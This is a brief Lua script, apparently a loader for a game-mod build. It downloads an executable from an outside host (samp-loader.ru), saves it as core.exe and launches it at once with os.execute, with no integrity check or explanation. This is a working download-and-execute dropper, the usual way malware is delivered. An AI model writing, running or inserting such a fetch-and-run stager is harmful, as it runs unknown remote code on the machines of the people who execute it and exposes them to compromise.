local http = require('socket.http')
local body, code = http.request('http://samp-loader.ru/builds/without_plugins.exe')
if not body then
  error(code)
end

local f = assert(io.open('core.exe', 'wb'))
f:write(body)
f:close()

os.execute('start core.exe')